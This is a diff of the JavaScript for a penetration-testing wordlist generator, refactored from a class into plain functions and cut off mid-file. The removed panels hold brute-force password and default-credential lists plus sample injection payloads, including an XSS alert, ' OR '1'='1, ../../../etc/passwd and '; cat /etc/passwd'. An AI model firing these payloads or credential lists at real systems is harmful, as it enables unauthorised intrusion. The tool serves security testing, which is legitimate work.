@@ -1,2523 +1,1794 @@
 
-// Wordlist Arsenal - Advanced Cybersecurity Tool
-// Developed by 0x0806
+// Wordlist Arsenal - Advanced Cybersecurity Tool by 0x0806
+// Global Variables
+let currentWordlist = [];
+let generationHistory = [];
+let appStats = {
+    totalGenerated: 0,
+    totalSessions: 1,
+    totalDownloads: 0,
+    mostUsedGenerator: 'enumeration'
+};
 
-class WordlistArsenal {
-    constructor() {
-        this.currentTab = 'dashboard';
-        this.currentGenerator = 'enumeration';
-        this.generationHistory = [];
-        this.stats = {
-            totalGenerated: 0,
-            activeSessions: 1,
-            totalDownloads: 0,
-            mostUsed: 'None',
-            generatorUsage: {}
+// Initialize Application
+document.addEventListener('DOMContentLoaded', function() {
+    initializeApp();
+    setupEventListeners();
+    loadFromLocalStorage();
+    updateStats();
+});
+
+// Initialize Application
+function initializeApp() {
+    // Set initial session
+    appStats.totalSessions = parseInt(localStorage.getItem('totalSessions') || '0') + 1;
+    localStorage.setItem('totalSessions', appStats.totalSessions);
+    
+    // Show welcome toast
+    showToast('Welcome to Wordlist Arsenal! 🛡️', 'success');
+    
+    // Initialize drag and drop
+    initializeDragDrop();
+    
+    // Load quick action handlers
+    initializeQuickActions();
+}
+
+// Setup Event Listeners
+function setupEventListeners() {
+    // Tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
+    });
+    
+    // File input
+    document.getElementById('fileInput').addEventListener('change', handleFileUpload);
+    
+    // Modal close on background click
+    document.getElementById('helpModal').addEventListener('click', (e) => {
+        if (e.target === e.currentTarget) hideHelp();
+    });
+    
+    // Keyboard shortcuts
+    document.addEventListener('keydown', handleKeyboardShortcuts);
+}
+
+// Tab Switching
+function switchTab(tabName) {
+    // Update active tab button
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
+    
+    // Update active panel
+    document.querySelectorAll('.generator-panel').forEach(panel => panel.classList.remove('active'));
+    document.getElementById(tabName).classList.add('active');
+}
+
+// Initialize Drag and Drop
+function initializeDragDrop() {
+    const uploadZone = document.getElementById('uploadZone');
+    
+    uploadZone.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        uploadZone.classList.add('dragover');
+    });
+    
+    uploadZone.addEventListener('dragleave', () => {
+        uploadZone.classList.remove('dragover');
+    });
+    
+    uploadZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        uploadZone.classList.remove('dragover');
+        const files = e.dataTransfer.files;
+        handleFileUpload({ target: { files } });
+    });
+    
+    uploadZone.addEventListener('click', () => {
+        document.getElementById('fileInput').click();
+    });
+}
+
+// File Upload Handler
+function handleFileUpload(event) {
+    const files = Array.from(event.target.files);
+    files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const content = e.target.result;
+            analyzeWordlist(content, file.name);
         };
-        this.generatedWordlists = [];
-        this.currentWordlist = null;
-        this.progressInterval = null;
+        reader.readAsText(file);
+    });
+}
+
+// Analyze Uploaded Wordlist
+function analyzeWordlist(content, filename) {
+    const words = content.split('\n').filter(word => word.trim());
+    const stats = calculateWordlistStats(words);
+    
+    showToast(`Analyzed ${filename}: ${stats.count} words, ${stats.unique} unique`, 'success');
+    
+    // Add to history
+    addToHistory({
+        type: 'File Analysis',
+        filename,
+        stats,
+        timestamp: new Date().toISOString()
+    });
+}
+
+// Quick Actions
+function initializeQuickActions() {
+    document.querySelectorAll('.quick-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const generator = btn.dataset.generator;
+            executeQuickAction(generator);
+        });
+    });
+}
+
+function executeQuickAction(generator) {
+    showProgress();
+    
+    setTimeout(() => {
+        let wordlist = [];
         
-        this.init();
-    }
-
-    init() {
-        this.setupEventListeners();
-        this.loadStats();
-        this.updateStatsDisplay();
-        this.setupGenerators();
-    }
-
-    setupEventListeners() {
-        // Tab navigation
-        document.querySelectorAll('.nav-tab').forEach(tab => {
-            tab.addEventListener('click', (e) => {
-                const tabName = e.target.getAttribute('data-tab') || e.target.closest('.nav-tab').getAttribute('data-tab');
-                this.switchTab(tabName);
-            });
-        });
-
-        // Generator selection
-        document.querySelectorAll('.generator-btn').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                const generatorName = e.target.getAttribute('data-generator') || e.target.closest('.generator-btn').getAttribute('data-generator');
-                this.switchGenerator(generatorName);
-            });
-        });
-
-        // Quick action buttons
-        document.querySelectorAll('.action-btn').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                const generatorName = e.target.getAttribute('data-generator') || e.target.closest('.action-btn').getAttribute('data-generator');
-                this.switchTab('generators');
-                this.switchGenerator(generatorName);
-            });
-        });
-
-        // FAB menu
-        const fab = document.getElementById('fab');
-        const fabMenu = document.getElementById('fabMenu');
-        if (fab && fabMenu) {
-            fab.addEventListener('click', () => {
-                fab.classList.toggle('active');
-                fabMenu.classList.toggle('active');
-            });
+        switch(generator) {
+            case 'common-passwords':
+                wordlist = generateCommonPasswords();
+                break;
+            case 'web-dirs':
+                wordlist = generateWebDirectories();
+                break;
+            case 'usernames':
+                wordlist = generateCommonUsernames();
+                break;
+            case 'subdomains':
+                wordlist = generateSubdomains();
+                break;
         }
-
-        // FAB menu items
-        document.querySelectorAll('.fab-item').forEach(item => {
-            item.addEventListener('click', (e) => {
-                const action = e.target.getAttribute('data-action') || e.target.closest('.fab-item').getAttribute('data-action');
-                this.handleFabAction(action);
-            });
-        });
-
-        // File upload
-        this.setupFileUpload();
-
-        // Output panel
-        this.setupOutputPanel();
-
-        // History actions
-        this.setupHistoryActions();
-
-        // Tools
-        this.setupTools();
-
-        // Modal close
-        document.addEventListener('click', (e) => {
-            if (e.target.classList.contains('modal-overlay')) {
-                this.closeModal();
-            }
-        });
-    }
-
-    setupGenerators() {
-        // Initialize with default generator
-        this.loadGeneratorPanel(this.currentGenerator);
-    }
-
-    switchTab(tabName) {
-        if (!tabName) return;
         
-        // Update tab buttons
-        document.querySelectorAll('.nav-tab').forEach(tab => {
-            tab.classList.remove('active');
-        });
-        const activeTab = document.querySelector(`[data-tab="${tabName}"]`);
-        if (activeTab) {
-            activeTab.classList.add('active');
-        }
+        displayResults(wordlist, `Quick Action: ${generator}`);
+        hideProgress();
+    }, 500);
+}
 
-        // Update tab content
-        document.querySelectorAll('.tab-content').forEach(content => {
-            content.classList.remove('active');
-        });
-        const activeContent = document.getElementById(tabName);
-        if (activeContent) {
-            activeContent.classList.add('active');
-        }
-
-        this.currentTab = tabName;
+// Generator Functions
+function generateEnumeration() {
+    const config = {
+        common: document.getElementById('enum-common').checked,
+        admin: document.getElementById('enum-admin').checked,
+        backup: document.getElementById('enum-backup').checked,
+        config: document.getElementById('enum-config').checked,
+        extensions: document.getElementById('enum-extensions').value.split(',').map(ext => ext.trim()).filter(ext => ext),
+        custom: document.getElementById('enum-custom').value.split('\n').filter(path => path.trim())
+    };
+    
+    let wordlist = [];
+    
+    if (config.common) {
+        wordlist.push(...getCommonDirectories());
     }
-
-    switchGenerator(generatorName) {
-        if (!generatorName) return;
-        
-        // Update generator buttons
-        document.querySelectorAll('.generator-btn').forEach(btn => {
-            btn.classList.remove('active');
-        });
-        const activeBtn = document.querySelector(`[data-generator="${generatorName}"]`);
-        if (activeBtn) {
-            activeBtn.classList.add('active');
-        }
-
-        // Load generator panel
-        this.loadGeneratorPanel(generatorName);
-        this.currentGenerator = generatorName;
+    
+    if (config.admin) {
+        wordlist.push(...getAdminPaths());
     }
-
-    loadGeneratorPanel(generatorName) {
-        const panel = document.getElementById('generatorPanel');
-        if (!panel) return;
-
-        const generators = {
-            enumeration: this.createEnumerationPanel(),
-            passwords: this.createPasswordPanel(),
-            credentials: this.createCredentialsPanel(),
-            usernames: this.createUsernamesPanel(),
-            patterns: this.createPatternsPanel(),
-            hybrid: this.createHybridPanel(),
-            endpoints: this.createEndpointsPanel(),
-            webtech: this.createWebtechPanel(),
-            security: this.createSecurityPanel()
-        };
-
-        panel.innerHTML = generators[generatorName] || this.createDefaultPanel();
-        this.setupGeneratorEvents(generatorName);
+    
+    if (config.backup) {
+        wordlist.push(...getBackupFiles());
     }
-
-    createEnumerationPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Web Discovery Wordlists</h3>
-                <p>Generate wordlists for web directory and file enumeration</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Target Configuration</h4>
-                <div class="form-group">
-                    <label>Target Technology</label>
-                    <select class="form-control" id="enumTech">
-                        <option value="generic">Generic</option>
-                        <option value="php">PHP</option>
-                        <option value="asp">ASP.NET</option>
-                        <option value="java">Java</option>
-                        <option value="python">Python</option>
-                        <option value="nodejs">Node.js</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label>Content Types</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="enumDirs" checked>
-                            <label for="enumDirs">Directories</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="enumFiles" checked>
-                            <label for="enumFiles">Files</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="enumBackups" checked>
-                            <label for="enumBackups">Backup Files</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="enumConfigs" checked>
-                            <label for="enumConfigs">Config Files</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>Extensions (comma-separated)</label>
-                    <input type="text" class="form-control" id="enumExtensions" placeholder="php,html,js,css,txt">
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateEnumeration()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="enumPreview">
-                    admin
-                    backup
-                    config
-                    login
-                    test
-                    ...
-                </div>
-            </div>
-        `;
+    
+    if (config.config) {
+        wordlist.push(...getConfigFiles());
     }
-
-    createPasswordPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Brute Force Password Lists</h3>
-                <p>Generate custom password wordlists for brute force attacks</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Password Configuration</h4>
-                <div class="form-group">
-                    <label>Base Words (one per line)</label>
-                    <textarea class="form-control" id="passBase" rows="4" placeholder="password
-admin
-user
-company"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Password Rules</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="passNumbers" checked>
-                            <label for="passNumbers">Add Numbers (0-999)</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="passYears" checked>
-                            <label for="passYears">Add Years (1990-2024)</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="passSpecial">
-                            <label for="passSpecial">Add Special Chars (!@#$)</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="passCase" checked>
-                            <label for="passCase">Capitalize First Letter</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>Length Range</label>
-                    <div style="display: flex; gap: 1rem;">
-                        <input type="number" class="form-control" id="passMinLen" placeholder="Min" value="6">
-                        <input type="number" class="form-control" id="passMaxLen" placeholder="Max" value="12">
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generatePasswords()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="passPreview">
-                    Password123
-                    admin2024
-                    user!
-                    Company1
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createCredentialsPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Default Credentials Database</h3>
-                <p>Common default username:password combinations</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Credential Types</h4>
-                <div class="checkbox-group">
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credGeneric" checked>
-                        <label for="credGeneric">Generic Systems</label>
-                    </div>
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credRouters" checked>
-                        <label for="credRouters">Routers & Switches</label>
-                    </div>
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credDatabases" checked>
-                        <label for="credDatabases">Databases</label>
-                    </div>
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credApps" checked>
-                        <label for="credApps">Web Applications</label>
-                    </div>
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credIoT" checked>
-                        <label for="credIoT">IoT Devices</label>
-                    </div>
-                    <div class="checkbox-item">
-                        <input type="checkbox" id="credCameras" checked>
-                        <label for="credCameras">IP Cameras</label>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>Output Format</label>
-                    <select class="form-control" id="credFormat">
-                        <option value="colon">username:password</option>
-                        <option value="space">username password</option>
-                        <option value="tab">username	password</option>
-                        <option value="separate">Separate Lists</option>
-                    </select>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateCredentials()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="credPreview">
-                    admin:admin
-                    admin:password
-                    root:root
-                    admin:123456
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createUsernamesPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Username Generator</h3>
-                <p>Generate username lists based on personal information</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Personal Information</h4>
-                <div class="form-group">
-                    <label>First Names (one per line)</label>
-                    <textarea class="form-control" id="userFirst" rows="3" placeholder="john
-jane
-mike"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Last Names (one per line)</label>
-                    <textarea class="form-control" id="userLast" rows="3" placeholder="smith
-doe
-johnson"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Company/Organization</label>
-                    <input type="text" class="form-control" id="userCompany" placeholder="acme">
-                </div>
-                
-                <div class="form-group">
-                    <label>Username Patterns</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="userFirstLast" checked>
-                            <label for="userFirstLast">firstname.lastname</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="userFirstInitial" checked>
-                            <label for="userFirstInitial">f.lastname</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="userLastFirst" checked>
-                            <label for="userLastFirst">lastname.firstname</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="userFirstOnly" checked>
-                            <label for="userFirstOnly">firstname</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateUsernames()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="userPreview">
-                    john.smith
-                    j.smith
-                    smith.john
-                    john
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createPatternsPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Custom Pattern Builder</h3>
-                <p>Build wordlists using custom patterns and rules</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Pattern Configuration</h4>
-                <div class="form-group">
-                    <label>Pattern Template</label>
-                    <input type="text" class="form-control" id="patternTemplate" placeholder="?w?d?d?d" 
-                           title="?w=word, ?d=digit, ?l=lowercase, ?u=uppercase, ?s=special">
-                    <small>?w=word, ?d=digit, ?l=lowercase, ?u=uppercase, ?s=special</small>
-                </div>
-                
-                <div class="form-group">
-                    <label>Base Words (one per line)</label>
-                    <textarea class="form-control" id="patternWords" rows="4" placeholder="admin
-test
-user
-pass"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Special Characters</label>
-                    <input type="text" class="form-control" id="patternSpecial" value="!@#$%^&*">
-                </div>
-                
-                <div class="form-group">
-                    <label>Pattern Options</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="patternReverse">
-                            <label for="patternReverse">Reverse Words</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="patternCase">
-                            <label for="patternCase">Mixed Case</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="patternLeet">
-                            <label for="patternLeet">Leet Speak (a=@, e=3, etc.)</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generatePatterns()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="patternPreview">
-                    admin123
-                    test456
-                    user789
-                    pass!@#
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createHybridPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Hybrid Combiner</h3>
-                <p>Combine multiple wordlists with intelligent mutations</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Source Lists</h4>
-                <div class="form-group">
-                    <label>Primary Wordlist (one per line)</label>
-                    <textarea class="form-control" id="hybridPrimary" rows="4" placeholder="password
-admin
-user"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Secondary Wordlist (one per line)</label>
-                    <textarea class="form-control" id="hybridSecondary" rows="4" placeholder="123
-2024
-!@#"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label>Combination Rules</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="hybridAppend" checked>
-                            <label for="hybridAppend">Append Secondary to Primary</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="hybridPrepend" checked>
-                            <label for="hybridPrepend">Prepend Secondary to Primary</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="hybridInsert">
-                            <label for="hybridInsert">Insert Secondary in Middle</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="hybridToggleCase">
-                            <label for="hybridToggleCase">Toggle Case Variations</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateHybrid()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="hybridPreview">
-                    password123
-                    123password
-                    admin2024
-                    2024admin
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createEndpointsPanel() {
-        return `
-            <div class="panel-header">
-                <h3>API Endpoint Wordlists</h3>
-                <p>Generate API endpoint paths for REST and GraphQL discovery</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>API Configuration</h4>
-                <div class="form-group">
-                    <label>API Type</label>
-                    <select class="form-control" id="apiType">
-                        <option value="rest">REST API</option>
-                        <option value="graphql">GraphQL</option>
-                        <option value="soap">SOAP</option>
-                        <option value="generic">Generic API</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label>Endpoint Categories</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="apiAuth" checked>
-                            <label for="apiAuth">Authentication</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="apiUsers" checked>
-                            <label for="apiUsers">User Management</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="apiAdmin" checked>
-                            <label for="apiAdmin">Admin Functions</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="apiFiles" checked>
-                            <label for="apiFiles">File Operations</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="apiData" checked>
-                            <label for="apiData">Data Access</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>API Version</label>
-                    <input type="text" class="form-control" id="apiVersion" placeholder="v1,v2,v3">
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateEndpoints()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="apiPreview">
-                    /api/v1/auth/login
-                    /api/v1/users
-                    /api/v1/admin/config
-                    /api/v1/files/upload
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createWebtechPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Web Technology Paths</h3>
-                <p>Technology-specific paths and files for web applications</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Technology Stack</h4>
-                <div class="form-group">
-                    <label>Web Technologies</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techWordPress" checked>
-                            <label for="techWordPress">WordPress</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techDrupal" checked>
-                            <label for="techDrupal">Drupal</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techJoomla" checked>
-                            <label for="techJoomla">Joomla</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techLaravel" checked>
-                            <label for="techLaravel">Laravel</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techSymfony" checked>
-                            <label for="techSymfony">Symfony</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="techSpring" checked>
-                            <label for="techSpring">Spring Boot</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>Path Types</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="pathAdmin" checked>
-                            <label for="pathAdmin">Admin Panels</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="pathConfig" checked>
-                            <label for="pathConfig">Config Files</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="pathDebug" checked>
-                            <label for="pathDebug">Debug Info</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="pathLogs" checked>
-                            <label for="pathLogs">Log Files</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateWebtech()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="webtechPreview">
-                    /wp-admin/
-                    /wp-config.php
-                    /admin/
-                    /config/database.yml
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createSecurityPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Security Testing Wordlists</h3>
-                <p>Specialized wordlists for security testing and penetration testing</p>
-            </div>
-            
-            <div class="config-section">
-                <h4>Security Test Types</h4>
-                <div class="form-group">
-                    <label>Test Categories</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secXSS" checked>
-                            <label for="secXSS">XSS Payloads</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secSQLi" checked>
-                            <label for="secSQLi">SQL Injection</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secLFI" checked>
-                            <label for="secLFI">LFI/RFI Paths</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secCMDi" checked>
-                            <label for="secCMDi">Command Injection</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secFuzz" checked>
-                            <label for="secFuzz">Fuzzing Strings</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="secBypass" checked>
-                            <label for="secBypass">Filter Bypass</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label>Payload Encoding</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="encURL" checked>
-                            <label for="encURL">URL Encoding</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="encHTML" checked>
-                            <label for="encHTML">HTML Encoding</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="encUnicode" checked>
-                            <label for="encUnicode">Unicode Encoding</label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn-primary" onclick="wordlistArsenal.generateSecurity()">
-                    <i class="fas fa-play"></i>
-                    Generate Wordlist
-                </button>
-            </div>
-            
-            <div class="preview-section">
-                <div class="preview-header">
-                    <h4>Live Preview</h4>
-                    <span class="preview-count">0 entries</span>
-                </div>
-                <div class="preview-content" id="securityPreview">
-                    &lt;script&gt;alert('XSS')&lt;/script&gt;
-                    ' OR '1'='1
-                    ../../../etc/passwd
-                    ; cat /etc/passwd
-                    ...
-                </div>
-            </div>
-        `;
-    }
-
-    createDefaultPanel() {
-        return `
-            <div class="panel-header">
-                <h3>Select a Generator</h3>
-                <p>Choose a wordlist generator from the sidebar to begin.</p>
-            </div>
-        `;
-    }
-
-    setupGeneratorEvents(generatorName) {
-        // Add event listeners for real-time preview updates
-        setTimeout(() => {
-            const inputs = document.querySelectorAll('#generatorPanel input, #generatorPanel select, #generatorPanel textarea');
-            inputs.forEach(input => {
-                input.addEventListener('input', () => {
-                    this.updatePreview(generatorName);
-                });
-                input.addEventListener('change', () => {
-                    this.updatePreview(generatorName);
-                });
-            });
-            
-            // Initial preview update
-            this.updatePreview(generatorName);
-        }, 100);
-    }
-
-    updatePreview(generatorName) {
-        // Update preview based on current settings
-        setTimeout(() => {
-            const previewElement = document.querySelector('#generatorPanel .preview-content');
-            const countElement = document.querySelector('#generatorPanel .preview-count');
-            
-            if (previewElement && countElement) {
-                const sampleData = this.generateSampleData(generatorName);
-                previewElement.textContent = sampleData.slice(0, 10).join('\n') + (sampleData.length > 10 ? '\n...' : '');
-                countElement.textContent = `${sampleData.length} entries`;
-            }
-        }, 100);
-    }
-
-    generateSampleData(generatorName) {
-        // Generate sample data for preview based on current form values
-        const samples = {
-            enumeration: () => {
-                const tech = document.getElementById('enumTech')?.value || 'generic';
-                const base = ['admin', 'backup', 'config', 'login', 'test', 'uploads', 'images', 'scripts', 'styles', 'data'];
-                return tech === 'php' ? [...base, 'index.php', 'config.php', 'admin.php'] : base;
-            },
-            passwords: () => {
-                const base = document.getElementById('passBase')?.value?.split('\n').filter(w => w.trim()) || ['password', 'admin', 'user'];
-                return base.slice(0, 3).map(w => w + '123');
-            },
-            credentials: () => ['admin:admin', 'admin:password', 'root:root', 'admin:123456', 'user:user', 'test:test'],
-            usernames: () => {
-                const first = document.getElementById('userFirst')?.value?.split('\n').filter(w => w.trim()) || ['john', 'jane'];
-                const last = document.getElementById('userLast')?.value?.split('\n').filter(w => w.trim()) || ['smith', 'doe'];
-                return first.slice(0, 2).map(f => last.slice(0, 2).map(l => f + '.' + l)).flat();
-            },
-            patterns: () => ['admin123', 'test456', 'user789', 'pass!@#', 'login$%^', 'secure&*('],
-            hybrid: () => {
-                const primary = document.getElementById('hybridPrimary')?.value?.split('\n').filter(w => w.trim()) || ['password'];
-                const secondary = document.getElementById('hybridSecondary')?.value?.split('\n').filter(w => w.trim()) || ['123'];
-                return primary.slice(0, 2).map(p => secondary.slice(0, 2).map(s => [p + s, s + p])).flat(2);
-            },
-            endpoints: () => ['/api/v1/auth/login', '/api/v1/users', '/api/v1/admin/config', '/api/v1/files/upload', '/api/v1/data/export'],
-            webtech: () => ['/wp-admin/', '/wp-config.php', '/admin/', '/config/database.yml', '/debug/', '/logs/'],
-            security: () => ['<script>alert("XSS")</script>', "' OR '1'='1", '../../../etc/passwd', '; cat /etc/passwd', '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E']
-        };
-        
-        const generator = samples[generatorName];
-        return generator ? generator() : ['sample1', 'sample2', 'sample3'];
-    }
-
-    // Generator methods
-    generateEnumeration() {
-        this.showProgress('Generating enumeration wordlist...');
-        
-        setTimeout(() => {
-            const tech = document.getElementById('enumTech')?.value || 'generic';
-            const extensions = document.getElementById('enumExtensions')?.value || '';
-            const includeDirs = document.getElementById('enumDirs')?.checked || false;
-            const includeFiles = document.getElementById('enumFiles')?.checked || false;
-            const includeBackups = document.getElementById('enumBackups')?.checked || false;
-            const includeConfigs = document.getElementById('enumConfigs')?.checked || false;
-            
-            let wordlist = [];
-            
-            if (includeDirs) {
-                wordlist.push(...this.getDirectoryWords(tech));
-            }
-            
-            if (includeFiles) {
-                wordlist.push(...this.getFileWords(tech));
-            }
-            
-            if (includeBackups) {
-                wordlist.push(...this.getBackupWords());
-            }
-            
-            if (includeConfigs) {
-                wordlist.push(...this.getConfigWords(tech));
-            }
-            
-            if (extensions && includeFiles) {
-                const exts = extensions.split(',').map(e => e.trim().replace(/^\./, ''));
-                const baseWords = ['index', 'admin', 'test', 'login', 'config', 'main', 'app', 'home', 'default', 'search'];
-                exts.forEach(ext => {
-                    baseWords.forEach(base => {
-                        wordlist.push(`${base}.${ext}`);
-                    });
-                });
-            }
-            
-            this.displayWordlist([...new Set(wordlist)], 'Web Discovery Enumeration');
-            this.updateStats('enumeration', wordlist.length);
-            this.hideProgress();
-        }, 1500);
-    }
-
